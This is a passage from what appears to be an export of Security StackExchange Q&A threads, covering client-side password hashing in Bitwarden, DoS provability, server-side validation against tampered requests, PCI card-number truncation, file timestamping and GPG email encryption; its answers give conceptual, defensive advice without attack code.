<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261209","<p>Why don't you get them to input their email and have it do an authentication process so the system knows it's actually them. Then you don't need any password.
Ex.
Input your email.
-Emails a code-
-User enters in code-
Allows access</p>
","-1"
"261064","261064","What's the point of hashing a password and then sending it to the server?","<p>If the password is hashed and then sent to the server where the hash is compared to the stored hash, this basically means that if someone had that hash they can still log in by sending the hash in the request, the password is just useless at this point.</p>
<p>I am talking with respect to Bitwarden. How does hashing a password make it more &quot;secure&quot;?</p>
","8","6","261065","<blockquote>
<p>If the password is hashed [locally] and then sent to the server where the hash is compared to the stored hash ... I am talking with respect to bitwarden</p>
</blockquote>
<p>This is not how it is done. From <a href=""https://bitwarden.com/help/what-encryption-is-used/"" rel=""noreferrer"">Bitwarden help</a>:</p>
<blockquote>
<p>Bitwarden salts and hashes your master password with your email address locally, before transmission to our servers. Once a Bitwarden server receives the hashed password, <strong>it is salted again</strong> with a cryptographically secure random value, <strong>hashed again</strong>, and stored in our database.</p>
</blockquote>
<p>So basically the locally hashed password is treated as the server visible secret and this is properly protected with server side hashing.</p>
<p>The point of local hashing is that the password that the user can remember is never transmitted, i.e. it is an additional security measure. While it is true that the resulting hash would be usable by an attacker instead of the original password, it is much harder to guess the long and kind of random hash than the way more weak password. And brute forcing this original user password is also made harder due to a deliberately slow hash function. What Bitwarden does here to harden a weak password is also known as <a href=""https://en.wikipedia.org/wiki/Key_stretching"" rel=""noreferrer"">Key stretching</a>.</p>
","29"
"261064","261064","What's the point of hashing a password and then sending it to the server?","<p>If the password is hashed and then sent to the server where the hash is compared to the stored hash, this basically means that if someone had that hash they can still log in by sending the hash in the request, the password is just useless at this point.</p>
<p>I am talking with respect to Bitwarden. How does hashing a password make it more &quot;secure&quot;?</p>
","8","6","261068","<blockquote>
<p>this basically means that if someone had that hash they can still log
in by sending the hash in the request,</p>
</blockquote>
<p>No this is a misunderstanding because you're forgetting that the program or app process is the same regardless of the input. This means if you send a hash as input it will be hashed again creating a completely different value. You would have to separately compromise the application or server in order to do what you are imagining.</p>
<p>On a deeper level it also helps programmatically in making the data input uniform in size and things like that which is why computers do it all the time.</p>
","1"
"261064","261064","What's the point of hashing a password and then sending it to the server?","<p>If the password is hashed and then sent to the server where the hash is compared to the stored hash, this basically means that if someone had that hash they can still log in by sending the hash in the request, the password is just useless at this point.</p>
<p>I am talking with respect to Bitwarden. How does hashing a password make it more &quot;secure&quot;?</p>
","8","6","261077","<p>I don't know much about Bitwarden, so this is a general answer.</p>
<p>Taking from <a href=""https://security.stackexchange.com/a/261065/6245"">Steffen Ulrich's answer</a> though, let's analyse this flow:</p>
<ol>
<li>User enters password in his application</li>
<li>The application hashes the password</li>
<li>The hash is sent to the server</li>
<li>The hash is hashed again and compared to a stored hash-of-a-hash-of-a-password.</li>
</ol>
<p>I'm omitting parts like salting and the choice of the hash algorithm, because all that they do is just make bruteforcing (aka guessing all possible passwords to find one that matches a hash) harder. We'll assume that the hashing algorithm is good enough that bruteforcing is infeasible.</p>
<p>So what's the reason for hashing at points (2) and (4)?</p>
<p>The hashing at (2) is done to remove the actual password from sight. People often <em>do</em> use the same password on multiple websites, so we want to do all that is possible to prevent hackers from seeing them. Even if our website gets compromised, at least we can protect our user's accounts on other websites. By hashing it already at (2) we ensure that no matter what the hackers might have compromised further down the line, they will NEVER get to see to the actual password.</p>
<p>Of course, if they have compromised your computer and installed a keylogger, then you're doomed. 100% security is impossible. But other parts of the system can be protected. And for hackers it is more efficient to go after servers, which are central points where 1000's of users connect to, than to try and hack 1000's of user computers (although the latter can be somewhat done with viruses and phishing).</p>
<p>Anyways, back to our scheme. So the point (2) is clear - but then why (4)? Precisely because of what you observed - that if someone gets their hands on the hash from (2), then even if they don't see the actual password, they can at least get access to THIS system. The hashing at (4) makes that harder, because it removes one place where the hashes from (2) could be found en masse - the database which stores them. Servers can and do get hacked, and every so often a hacker finds themselves with access to some database. Maybe it is the live production database, maybe it is a backup copy, who knows. The point is - if we do step (4), then the hashes from (2) won't be there. Only hashes-of-hashes. And you can't use those to log on to the system.</p>
<p>Of course, if you have access to the database, then maybe you don't care about knowing the hash from (2) anymore... Or maybe there is still something that cannot be accessed without knowing it. For example, you could encrypt some data by using the hash from (2) as a key.</p>
","9"
"261064","261064","What's the point of hashing a password and then sending it to the server?","<p>If the password is hashed and then sent to the server where the hash is compared to the stored hash, this basically means that if someone had that hash they can still log in by sending the hash in the request, the password is just useless at this point.</p>
<p>I am talking with respect to Bitwarden. How does hashing a password make it more &quot;secure&quot;?</p>
","8","6","261080","<p>The point is to not be storing or transmitting passwords in plain text.
This is basically it. Everything else is all about making it hard to derive that text or other text that will achieve the same end, otherwise we would just use CRC-16 an be done with it.</p>
<p>Where this falls over is that storing a hash digest where people have access to both the digest and the hash algorithm becomes a risk.</p>
<p>So generally it is encrypted at rest after multiple rounds of hashing and salting, and there is minimal access to the encrypted data.</p>
<p>Frankly the encryption and vaulting is more important than salting and hashing. Given 30 million hashes it is trivial to group and sort the duplicates, and we pretty much know what the top 50 will be.</p>
<p>But really - not plain text. That is all. Not to prevent index hotspots or file splitting, but plain text. In the days of FTP an Telnet and Kermit we did not have SSH, or SSL, or IPsec.</p>
","1"
"261064","261064","What's the point of hashing a password and then sending it to the server?","<p>If the password is hashed and then sent to the server where the hash is compared to the stored hash, this basically means that if someone had that hash they can still log in by sending the hash in the request, the password is just useless at this point.</p>
<p>I am talking with respect to Bitwarden. How does hashing a password make it more &quot;secure&quot;?</p>
","8","6","261086","<p>I think the other answers do not properly address your question about the risk of an attacker re-using the hash that the client sends. Therefore:</p>
<hr />
<p>While the hashing prevents the server from ever knowing the plain password, your point is absolutely valid: it does not prevent a malicious re-use of the hash. If the client-side generated hash is used again, that is referred to as a <a href=""https://en.wikipedia.org/wiki/Replay_attack"" rel=""nofollow noreferrer""><strong>replay attack</strong></a>.</p>
<p>This can be avoided by adding a <strong>session token</strong>, which is randomly generated by the server and sent to the client with the login request. The session token can be used as a salt to hash or encrypt the transferred value. (In this case, it would be encrypt, because it needs to be reversible by the server.) See <a href=""https://en.wikipedia.org/wiki/Replay_attack#Prevention_and_countermeasures"" rel=""nofollow noreferrer""><em>Prevention and countermeasures</em></a> in the Wikipedia article for details.</p>
<p>If an attacker then gets hold of the transferred value, it is useless, because if they open a a login request, the server will generate another session token.</p>
<p>For clarification: this would have to be an additional measure on top of rather than instead of the existing hashing.</p>
<p><strong>Does Bitwarden use a session token?</strong></p>
<p>Searching the Bitwarden online documentation, I wasn't able to find  out if Bitwarden uses this technique. Instead, I found <a href=""https://www.reddit.com/r/Bitwarden/comments/m3nzo5/comment/gr077z9/"" rel=""nofollow noreferrer"">this reddit thread which actually supports your concerns</a>.</p>
<p>Yet, note also that Bitwarden offers two-factor authentication (2FA), which mitigates the risk of a replay attack significantly.</p>
","1"
"261064","261064","What's the point of hashing a password and then sending it to the server?","<p>If the password is hashed and then sent to the server where the hash is compared to the stored hash, this basically means that if someone had that hash they can still log in by sending the hash in the request, the password is just useless at this point.</p>
<p>I am talking with respect to Bitwarden. How does hashing a password make it more &quot;secure&quot;?</p>
","8","6","261096","<p>Based on the elaboration in the answer by Steffan that both client and server do some hashing, there are a few notable security advantages to doing it this way compared with just sending the password.</p>
<ul>
<li>It <strong>demonstrates</strong> safety from password stealing. Yes, an attacker breaking into Bitwarden's server would have difficulty getting the password back if Bitwarden are doing all the hashing stuff correctly, but that's an if. This moves some of the best practice to the client-side, so you could confirm that if.</li>
<li>It provides safety even from Bitwarden stealing your password. Which is a bit of a funny thought, especially about Bitwarden given they have all your other passwords! But in general, hashing and salting server side only protects your passwords at rest. Doing it this way this means that even if a rogue employee added &quot;Email me everyone's password&quot; to the login script, they still couldn't try that password against your bank.</li>
<li>It provides some further security in transmission. For example, even talking to a server with an encrypted HTTPS connection can still reveal how much data you're sending. That means a snooper might be able to distinguish whether you use a long or short password. Hashes, however, are fixed length so there's no possible length-based information loss here.</li>
</ul>
","2"
"261032","261032","Can one prove that a server can be secure against DoS?","<p>Is it possible to prove mathematically that a server is immune to denial-of-service attacks? Or is there some result in computer science journal that it this is an impossible task to do?</p>
","10","3","261033","<h1>You cannot be immune to Resource Exhaustion</h1>
<p>It's fundamentally not possible. Every server or cluster of servers has a maximum amount of workload. If an attacker is capable of exceeding that, then you will not have enough to serve your intended customers and thus you have a Denial-of-Service attack.</p>
<p>For the sake of clarity, &quot;resource exhaustion&quot; is one form of Denial-of-Service, but there are several more. For example, I could abuse a vulnerability in your code to crash your server repeatedly, lock all customer accounts, use shaped charges to breach the walls of the datacenter and then go wild on your servers with a shotgun, etc... All of these would result in &quot;Denial-of-Service&quot; in one form or another, but their mitigations are very different.</p>
<p>My point is that you cannot mathematically prove to be immune from Resource Exhaustion, because no one can be immune. Nor can you provide proof to be immune from someone physically destroying your servers, etc...</p>
<h1>Provable security is possible - to a degree</h1>
<p><a href=""https://en.wikipedia.org/wiki/Provable_security"" rel=""noreferrer"">Provable Security</a> refers to some form of mathematical proof, which ensures that a certain product ensures it will do what it claims to do. The seL4 microkernel, for example, has some proof that some functions do what they claim to do (although that doesn't mean it is impossible that the hardware used to run it has no vulnerabilities).</p>
<p>However, trying to prove that a microkernel does something and trying to prove than an application does something are two <em>vastly</em> different tasks, because an application depends on so many layers below, that it becomes functionally impossible.</p>
","40"
"261032","261032","Can one prove that a server can be secure against DoS?","<p>Is it possible to prove mathematically that a server is immune to denial-of-service attacks? Or is there some result in computer science journal that it this is an impossible task to do?</p>
","10","3","261052","<p>Yes, disconnect it from the internet ;)</p>
<p>Seriously though, even if you properly scope your resources to handle &quot;legitimate&quot; requests, and also somehow guarantee that you only need to do the most minimal amount of work to determine whether any <a href=""https://www.ietf.org/rfc/rfc3514.txt"" rel=""nofollow noreferrer"">packet of data is &quot;bad&quot;</a> so you can ignore the contents, attackers could still flood you with enough &quot;bad&quot; packets that &quot;legitimate&quot; traffic is processed more slowly or not at all.</p>
","4"
"261032","261032","Can one prove that a server can be secure against DoS?","<p>Is it possible to prove mathematically that a server is immune to denial-of-service attacks? Or is there some result in computer science journal that it this is an impossible task to do?</p>
","10","3","261078","<p>In practice? Absolutely Resounding <strong>NO</strong>.</p>
<p>In theory? <strong>yes</strong>. To wit:</p>
<ul>
<li>step 1. you can use  <a href=""https://en.wikipedia.org/wiki/Formal_methods"" rel=""nofollow noreferrer"">formal methods</a> to mathematically evaluate <em>every possible combination of states</em> your program can ever take, and amount of resources it uses in the worst case. (Note that this gets <em><strong>hugely expensive really fast</strong></em> the more complex your program is, but is <em>theoretically</em> doable, if the universe lasts long enough and you have enough computing resources to throw at the process. So, as prerequisites, make sure service provided by your server is extremely simple, that you are preferably immortal, and that your patience is astronomical)</li>
<li>step 2. when you have calculated the worst case resource usage, you simply make sure that you have more resources available for your server than all the rest of the universe combined (as we'll surely be way more than just multi-planetary species by then) can throw at you. Might be somewhat costly and tiresome to implement too (but those are just economic and engineering details, not worthy the attention of pure theorist)</li>
<li>step 3. profit.</li>
</ul>
<p>Summary: given that you asked this on <code>security.SE</code> and <strong>not</strong> <code>math.SE</code>:</p>
<p><strong>No, it is not possible to prove that a server can be secure against DoS.</strong></p>
","4"
"260958","260958","Does client-side data tampering allow more than just evading validation? Dictionary attacks? Brute-force login attempts?","<p>I am trying to better understand and determine the impact and implications of a web app where data tamping is possible.</p>
<p>When discussing data tampering, I am referring to when you are able to use a tool such as BurpSuite or Tamper Data to intercept a request and modify the data and submit it successfully.</p>
<p>I understand that this will allow an attacker to evade Client-side validations. For example, if the client does not allow certain symbols e.g. (!#[]) etc, an attack can input the correct details which the client will validate and then intercept the request and modify the data to include those symbols. But I'm thinking there is more than just the evasion of client-side validation that this vulnerability allows.</p>
<p>I am also thinking it perhaps opens the door to allow Dictionary-attacks using BurpSuite or Brute-force logins to user accounts since data can be intercepted and modified which can be used to test username and password combinations.</p>
<p>Would appreciate any insight regarding the implications of a Data Tampering vulnerability.</p>
","6","4","260959","<p>This &quot;Data Tamper Vulnerability&quot; is not a vulnerability. It's like &quot;Door without lock vulnerability.&quot;</p>
<p>Client-side validation is not validation. Is a convenience tool: better let the user know instantly that he cannot have <code>#</code> as username then waiting for the form to be submitted, the server reject the username and send back an error message stating that the username was not accepted AND he has to fill out the entire form again.</p>
<p>If your threat model does not include &quot;user submitting data without
validation,&quot; you are doing it wrong. When an attacker sees your javascript stripping <code>#</code> from a field, one of the first things he will try is to send <code>#</code> on a field, and your server must deal with it.</p>
<p>Do proper validation on the server. Never trust any data from the client: form fields, URL, GET parameters, cookies, JWT, filenames, everything coming from the client is untrusted until validated <strong>on the server</strong>.</p>
<p>If the client is sending malicious input and the server is not validating, several bad things can happen:</p>
<ul>
<li>SQL Injection</li>
<li>Remote Code Execution</li>
<li>Cross Site Scripting</li>
<li>Server side request forgery</li>
<li>Remote file inclusion</li>
</ul>
<p>... to name a few.</p>
","45"
"260958","260958","Does client-side data tampering allow more than just evading validation? Dictionary attacks? Brute-force login attempts?","<p>I am trying to better understand and determine the impact and implications of a web app where data tamping is possible.</p>
<p>When discussing data tampering, I am referring to when you are able to use a tool such as BurpSuite or Tamper Data to intercept a request and modify the data and submit it successfully.</p>
<p>I understand that this will allow an attacker to evade Client-side validations. For example, if the client does not allow certain symbols e.g. (!#[]) etc, an attack can input the correct details which the client will validate and then intercept the request and modify the data to include those symbols. But I'm thinking there is more than just the evasion of client-side validation that this vulnerability allows.</p>
<p>I am also thinking it perhaps opens the door to allow Dictionary-attacks using BurpSuite or Brute-force logins to user accounts since data can be intercepted and modified which can be used to test username and password combinations.</p>
<p>Would appreciate any insight regarding the implications of a Data Tampering vulnerability.</p>
","6","4","260972","<blockquote>
<p>I understand that this will allow an attacker to evade Client-side validations.</p>
</blockquote>
<p>You're thinking of the roles backwards. If you're trying to make software running on an end user's computer enforce some rule of your own against what they want to do, <em>you are the attacker</em> and they are the defender. Don't be in that role.</p>
<p>Where you are the defender is on your own server, processing the data the user sent you via the software you provided to them to help them submit it in a manner most useful to them. That's where you have both the technical capability and the standing to do so. Get it right and you don't have to worry about trying to make the user's own computer police them.</p>
","7"
"260958","260958","Does client-side data tampering allow more than just evading validation? Dictionary attacks? Brute-force login attempts?","<p>I am trying to better understand and determine the impact and implications of a web app where data tamping is possible.</p>
<p>When discussing data tampering, I am referring to when you are able to use a tool such as BurpSuite or Tamper Data to intercept a request and modify the data and submit it successfully.</p>
<p>I understand that this will allow an attacker to evade Client-side validations. For example, if the client does not allow certain symbols e.g. (!#[]) etc, an attack can input the correct details which the client will validate and then intercept the request and modify the data to include those symbols. But I'm thinking there is more than just the evasion of client-side validation that this vulnerability allows.</p>
<p>I am also thinking it perhaps opens the door to allow Dictionary-attacks using BurpSuite or Brute-force logins to user accounts since data can be intercepted and modified which can be used to test username and password combinations.</p>
<p>Would appreciate any insight regarding the implications of a Data Tampering vulnerability.</p>
","6","4","260978","<p>Proper web site/app security MUST assume that the client may sometimes actually be a custom made malicious tool, designed and built from the ground up by an attacker for the express purpose of defeating your security. If your server-side security cannot protect against such a tool, then you don't actually have security at all.</p>
<p>If you do have actual server-side security, then client-side data tampering simply is not an issue. Anything that client-side data tampering could do, a hypothetical custom attacker's tool could also do, so if your server is secure against a custom malicious tool then it is secure against client-side data tampering.</p>
","18"
"260958","260958","Does client-side data tampering allow more than just evading validation? Dictionary attacks? Brute-force login attempts?","<p>I am trying to better understand and determine the impact and implications of a web app where data tamping is possible.</p>
<p>When discussing data tampering, I am referring to when you are able to use a tool such as BurpSuite or Tamper Data to intercept a request and modify the data and submit it successfully.</p>
<p>I understand that this will allow an attacker to evade Client-side validations. For example, if the client does not allow certain symbols e.g. (!#[]) etc, an attack can input the correct details which the client will validate and then intercept the request and modify the data to include those symbols. But I'm thinking there is more than just the evasion of client-side validation that this vulnerability allows.</p>
<p>I am also thinking it perhaps opens the door to allow Dictionary-attacks using BurpSuite or Brute-force logins to user accounts since data can be intercepted and modified which can be used to test username and password combinations.</p>
<p>Would appreciate any insight regarding the implications of a Data Tampering vulnerability.</p>
","6","4","260999","<p>Other answers correct you on client side vulnerabilities.</p>
<p>I want to add this rather direct answer to be very clear.</p>
<p><em>Every attack is indeed possible, unless your own server deliberately prevents it.</em></p>
<p>While we can nitpick that (not every attack, and not all attacks are literally server prevented), the broad picture that paint is both true and a useful way to think about it.</p>
<p>That means, for example...</p>
<ul>
<li>Brute force attacks are easy ... <em>unless your server limits the number of attempts allowed in some way</em>.</li>
<li>User accounts and passwords can be stolen or intercepted, if the clients machines or networking is weak on security. Since you don't control that, you only have limited ways to prevent or mitigate it.</li>
<li>User forms, text, web requests and values returned,and local storage/cookies, can be faked or targeted maliciously. Again not in your control, you can only do the things you can do. You don't control clients. You do control your own systems. And you can hope the clients have some decent security.</li>
</ul>
","6"
"260940","260940","PCI Card Number Definition","<p>We are using a truncation strategy to eliminate card numbers.   In order to develop, I need the original pre-truncated data files.    The test environment is not allowed to have live card numbers.    I wrote a program that basically obfuscates the card numbers.   The deal is that occasionally numbers are going to validate as card numbers.   I’m dealing with thousands of files and millions of card numbers.</p>
<p>For example:</p>
<p>Card Number
37111234569999</p>
<p>Obfuscated to:
37110000009999</p>
<p>So we know that 37111234569999 is an active, currently used card number in our system.  37110000009999 would not be an active, currently used card number but it could validate as one.</p>
<p>My question is would 37110000009999 be considered card data or not?   If it would be considered card data, then how are we supposed to test systems with lots of data?</p>
<p>I have looked on the pci website and cannot find a specific enough definition.</p>
","0","3","260941","<p><em>(answer substantially edited. Original in Edit History)</em></p>
<p>PCI-DSS gives this guidance on truncation of PANs:</p>
<blockquote>
<p>The intent of truncation is to permanently remove a segment of PAN data so that only a portion (generally not to exceed the first six and last four digits) of the PAN is stored.</p>
</blockquote>
<p>So your example of</p>
<pre><code>Card Number 37111234569999
Obfuscated to: 37110000009999
</code></pre>
<p>May actually fit. However, you'll also need to be careful about this note and make sure you can demonstrate that to an auditor's satisfaction:</p>
<blockquote>
<p><em>Note: It is a relatively trivial effort for a malicious individual to reconstruct original PAN data if they have access to both the truncated and hashed version of a PAN. Where hashed and truncated versions of the same PAN are present in an entity’s environment, additional controls must be in place to ensure that the hashed and truncated versions cannot be correlated to reconstruct the original PAN.</em></p>
</blockquote>
<hr />
<p>I am not a PCI auditor. You say that you have millions of entries of live card data flowing into your test environment and you're trying to sanitize them on the way by. That's <em>really close</em> to <strong>wrong</strong> and only one code bug or missed edge-case away from having live data in your test environment.</p>
<p>As @Ghedipunk said in comments, if I was your Legal &amp; Compliance team, I would not accept some random opinion from some random website as authoritative here; you should really hire a certified PCI auditor to get an official ruling on this.</p>
","3"
"260940","260940","PCI Card Number Definition","<p>We are using a truncation strategy to eliminate card numbers.   In order to develop, I need the original pre-truncated data files.    The test environment is not allowed to have live card numbers.    I wrote a program that basically obfuscates the card numbers.   The deal is that occasionally numbers are going to validate as card numbers.   I’m dealing with thousands of files and millions of card numbers.</p>
<p>For example:</p>
<p>Card Number
37111234569999</p>
<p>Obfuscated to:
37110000009999</p>
<p>So we know that 37111234569999 is an active, currently used card number in our system.  37110000009999 would not be an active, currently used card number but it could validate as one.</p>
<p>My question is would 37110000009999 be considered card data or not?   If it would be considered card data, then how are we supposed to test systems with lots of data?</p>
<p>I have looked on the pci website and cannot find a specific enough definition.</p>
","0","3","260944","<p>I'm not sure why you need a file from production in order to do your development - you should be able to mock one up from the specification you're working from, or ask the company sending it to you whether they have a test environment that generates fake files.</p>
<p>That said, depending on how closely your data needs to mimic production, there's two options that don't involve bringing anything back from production (with all the compliance issues that causes).</p>
<h3>Test cards</h3>
<p>There's a number of standard test card numbers that the card brands have indicated will never be issued - <a href=""https://www.paypalobjects.com/en_GB/vhelp/paypalmanager_help/credit_card_numbers.htm"" rel=""nofollow noreferrer"">this link</a> has a list of some of them, but there are others.  Assuming duplicate values don't cause issues with your file, just generate it with randomly chosen test cards.  They may <em>look</em> like PCI data, but they're safe.</p>
<h3>Randomly generated PANs</h3>
<p>If you really need uniqueness, your next best option is to just randomly generate PANs.  Odds are fairly decent that the numbers you come up with are actually a real card number, just because any sixteen digit number with the right prefix could be, but since it's not actually based on real cards you shouldn't have too much trouble from an auditor.  Just be prepared to show the process you used to generate them.  Even better if you put in a block of 0's somewhere (digits 2-6?) just to make it clear it's not valid.</p>
<p>Superficially, this would look the same as the method you were suggesting.  But because the numbers are being pulled out of a hat rather than scrubbed from production, 1) you won't know whether or not any given card is actually valid and 2) even if it happens to be, you won't have the expiration date associated with that card.</p>
<h3>If all else fails...</h3>
<p>If for some reason neither of these is workable options, and you absolutely <em>must</em> have scrubbed production data, then you're going to need to sit down with your legal department and your auditor, explain the situation, and see what will be acceptable to them.  Your method <em>could</em> be good enough for them, but as the other answer says, it's very easy to miss a line of code and fail to mask correctly.</p>
","2"
"260940","260940","PCI Card Number Definition","<p>We are using a truncation strategy to eliminate card numbers.   In order to develop, I need the original pre-truncated data files.    The test environment is not allowed to have live card numbers.    I wrote a program that basically obfuscates the card numbers.   The deal is that occasionally numbers are going to validate as card numbers.   I’m dealing with thousands of files and millions of card numbers.</p>
<p>For example:</p>
<p>Card Number
37111234569999</p>
<p>Obfuscated to:
37110000009999</p>
<p>So we know that 37111234569999 is an active, currently used card number in our system.  37110000009999 would not be an active, currently used card number but it could validate as one.</p>
<p>My question is would 37110000009999 be considered card data or not?   If it would be considered card data, then how are we supposed to test systems with lots of data?</p>
<p>I have looked on the pci website and cannot find a specific enough definition.</p>
","0","3","260993","<p>I think PCI SSC FAQ 1091 is your friend.</p>
<p><a href=""https://pcissc.secure.force.com/faq/articles/Frequently_Asked_Question/What-are-acceptable-formats-for-truncation-of-primary-account-numbers"" rel=""nofollow noreferrer"">https://pcissc.secure.force.com/faq/articles/Frequently_Asked_Question/What-are-acceptable-formats-for-truncation-of-primary-account-numbers</a></p>
<p>You need to be able to show an assessor that '0' is your truncation character (rather than *), and yes, you may randomly have a truncated PAN that passes a luhn check, but it is not an actual card that you have received in a transaction. But you should be fine exporting truncated data from the CDE to the test environment based on an acceptable truncation format based on this FAQ. You will need to prove isolation between the CDE (where the truncation happens) and the test environment.</p>
","1"
"260920","260920","Proving that a file existed at a time","<p>How do I acquire the means to prove in the future that I had possission of a
file now, without relying on the integrity of a single entity?  (I believe one
way of doing it would be to put the file through SHA1, and send a minimal
amount of Ether (0.001) to the resulting Ethereum address (both SHA1 hashes and
Ethereum addresses being 40 hexadecimals).  But perhaps there are cheaper and
more secure ways of doing it?  Would this sort of proof be practical in a court
of law?  (I suppose a ``computer expert'' would have to testify.)  I see
time-stamping services being mentioned; but these seem to have 2 problems I'd
like to avoid: (1) they require trust in a single entity; (2) they only work as
long as the service is maintained.)</p>
<p>(This post has been edited after some of the answers and comments were made.)</p>
","1","3","260921","<ol>
<li>The collision resistance of SHA1 is under attack.  So yes, it is a problem for this usage.  Maybe not this week. I wouldn't, without a data center of GPUs, claim I can find a collision for a SHA1 hash.  But on a long enough timeline I don't expect this proof to stand, esp with no metadata.</li>
<li>I feel as though any data can be put in the payload of ETH.  It will just cost more gas.  So I don't understand the SHA1 limit.  100 bytes (typical ETH submission size) is enough for filename, SHA3-256/512, file size and checksum.  The increased hash length and metadata greatly limits the possibility of a collision.  Depending on file size, possibly to zero.</li>
</ol>
","0"
"260920","260920","Proving that a file existed at a time","<p>How do I acquire the means to prove in the future that I had possission of a
file now, without relying on the integrity of a single entity?  (I believe one
way of doing it would be to put the file through SHA1, and send a minimal
amount of Ether (0.001) to the resulting Ethereum address (both SHA1 hashes and
Ethereum addresses being 40 hexadecimals).  But perhaps there are cheaper and
more secure ways of doing it?  Would this sort of proof be practical in a court
of law?  (I suppose a ``computer expert'' would have to testify.)  I see
time-stamping services being mentioned; but these seem to have 2 problems I'd
like to avoid: (1) they require trust in a single entity; (2) they only work as
long as the service is maintained.)</p>
<p>(This post has been edited after some of the answers and comments were made.)</p>
","1","3","260937","<p>If my answer is in line with your context.
You need a way to validate and prove that you had a file at a set time.
If a computer expert can testify as you say then you can do full system image as backup of your drive. And as such you can keep the hashes of the file as evidence. Most like computer forensics knowledge will be needed.</p>
<p>Sha256/sha512 would be better in this case.</p>
","-1"
"260920","260920","Proving that a file existed at a time","<p>How do I acquire the means to prove in the future that I had possission of a
file now, without relying on the integrity of a single entity?  (I believe one
way of doing it would be to put the file through SHA1, and send a minimal
amount of Ether (0.001) to the resulting Ethereum address (both SHA1 hashes and
Ethereum addresses being 40 hexadecimals).  But perhaps there are cheaper and
more secure ways of doing it?  Would this sort of proof be practical in a court
of law?  (I suppose a ``computer expert'' would have to testify.)  I see
time-stamping services being mentioned; but these seem to have 2 problems I'd
like to avoid: (1) they require trust in a single entity; (2) they only work as
long as the service is maintained.)</p>
<p>(This post has been edited after some of the answers and comments were made.)</p>
","1","3","260939","<p>As @user mentions, there have been public services for this pretty much since the beginning of the internet; they are called Time Stamping Authorities (TSAs).</p>
<p>From a quick google search shows that there's a bunch of free and commercial TSAs.</p>
<ul>
<li>If you want to try it, <a href=""https://www.freetsa.org/index_en.php"" rel=""nofollow noreferrer"">freetsa.org</a> lets you upload a file to be timestamped right from their site: <a href=""https://www.freetsa.org/index_en.php"" rel=""nofollow noreferrer"">https://www.freetsa.org/index_en.php</a></li>
<li><a href=""https://www.ascertia.com/products/adss-tsa-server/"" rel=""nofollow noreferrer"">Ascertia TSA</a></li>
<li><a href=""https://www.entrust.com/digital-security/certificate-solutions/products/digital-signing/entrust-timestamping-authority"" rel=""nofollow noreferrer"">Entrust TSA</a></li>
<li><a href=""https://www.identrust.com/timestamping-authority-server"" rel=""nofollow noreferrer"">IdenTrust TSA</a></li>
</ul>
<p>TSAs are an important part of the Windows code signing ecosystem. Open any signed binary and you'll see that part of the code signature is a timestamp showing that the binary has not been modified since the date shown.</p>
<p><a href=""https://i.stack.imgur.com/D5JM9.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/D5JM9.png"" alt=""firefox.exe signature timestamp"" /></a></p>
<p>So I think you have re-invented a technology that has existed basically since the beginning of modern computing.</p>
","4"
"260895","260895","Securing Email: use GPG for all emails?","<p>I am thinking of using GPG to sign commits and particularly to secure emails, and have some questions regarding the usefulness.</p>
<hr />
<p><strong>Basic threat model</strong></p>
<p>(I use LESP as abbreviation for large email service provider)</p>
<p>The data in transit may not be secure <a href=""https://support.google.com/transparencyreport/answer/7381230?hl=en#zippy=%2Chow-does-encryption-in-transit-relate-to-https-access-to-gmail"" rel=""nofollow noreferrer"">if the recipient isn't a LESP user</a>. But that may be rare these days.</p>
<p>Most email data is TLS secured (over the wire) but non-secured at rest - if the service provider holds the private key or the data is not encrypted.</p>
<p>GMail does not seem to encrypt at rest or, if they do, tell much about it (do they have the private key? is it encrypted?). It is not in the <a href=""https://support.google.com/transparencyreport/answer/7381230?hl=en"" rel=""nofollow noreferrer"">transparency report</a>, for example.</p>
<p>ProtonMail instead, uses e2e encryption and it is based in Switzerland. In ProtonMail, the private key is encrypted with a secure passphrase, hence if you lose it you lose access to the data, as it can not be decrypted any more (unless setting up recovery mechanisms).</p>
<p><em>I do not know though, whether they could store a plain text copy of the private key.</em></p>
<p>In any case, the emails to/from LESPs' users won't be secured at rest so I went ahead and create a GPG key. They would also need one to communicate both ways.</p>
<hr />
<p><strong>Question</strong></p>
<ul>
<li>Does GMail or BESPs in general encrypt at rest and own the private key?</li>
<li>Does ProtonMail store the encrypted PK in their server?</li>
<li>Would using GPG for every email be paranoic?</li>
</ul>
","3","3","260896","<p>I do not know the first 2 answers, Gmail or Pmail.</p>
<p>What I can tell you is that if you wish your messages to be safe is to always use PGP. That forces that you and the destination to have exchanged keys.
Not always easy to do it and others might not understand how to do it.
If you achieve this the message will be protected in transit and in rest in the mail server independently if the host does it or not.
It will be even protected in your computer as you will need to enter the password for the certificate to decrypt it, if you wish so.</p>
<p>You will own your security and not be dependent on what third parties can or cannot do.</p>
<p>I also use PGP for my email for signing and when possible to encrypt it.</p>
","2"
"260895","260895","Securing Email: use GPG for all emails?","<p>I am thinking of using GPG to sign commits and particularly to secure emails, and have some questions regarding the usefulness.</p>
<hr />
<p><strong>Basic threat model</strong></p>
<p>(I use LESP as abbreviation for large email service provider)</p>
<p>The data in transit may not be secure <a href=""https://support.google.com/transparencyreport/answer/7381230?hl=en#zippy=%2Chow-does-encryption-in-transit-relate-to-https-access-to-gmail"" rel=""nofollow noreferrer"">if the recipient isn't a LESP user</a>. But that may be rare these days.</p>
<p>Most email data is TLS secured (over the wire) but non-secured at rest - if the service provider holds the private key or the data is not encrypted.</p>
<p>GMail does not seem to encrypt at rest or, if they do, tell much about it (do they have the private key? is it encrypted?). It is not in the <a href=""https://support.google.com/transparencyreport/answer/7381230?hl=en"" rel=""nofollow noreferrer"">transparency report</a>, for example.</p>
<p>ProtonMail instead, uses e2e encryption and it is based in Switzerland. In ProtonMail, the private key is encrypted with a secure passphrase, hence if you lose it you lose access to the data, as it can not be decrypted any more (unless setting up recovery mechanisms).</p>
<p><em>I do not know though, whether they could store a plain text copy of the private key.</em></p>
<p>In any case, the emails to/from LESPs' users won't be secured at rest so I went ahead and create a GPG key. They would also need one to communicate both ways.</p>
<hr />
<p><strong>Question</strong></p>
<ul>
<li>Does GMail or BESPs in general encrypt at rest and own the private key?</li>
<li>Does ProtonMail store the encrypted PK in their server?</li>
